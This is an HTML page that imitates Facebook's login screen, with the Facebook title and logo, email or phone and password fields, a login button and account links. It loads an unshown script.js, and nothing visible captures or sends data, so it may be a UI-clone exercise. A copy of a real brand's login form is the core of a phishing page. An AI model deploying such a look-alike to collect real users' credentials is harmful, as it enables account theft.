<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="logo">
    <img src="images/facebook-logo.svg" alt="">
</div>
<div class="input-box">
    <div class="login-facebook">
        <p>Log in to Facebook</p>
    </div>
    <div class="input-menu">
        <div class="username"><input type="text" placeholder="Email address or phone number"></div>
        <div class="password"><input type="password" placeholder="Password"></div>
        <div class="login-button"><button>Log in </button></div>
        <div class="last-line">
            <a href="#">Forgotten account ?</a>
            <a href="#">Sign up for Facebook</a>
        </div>
    </div>
</div>
<script src="script.js"></script>
</body>
</html>
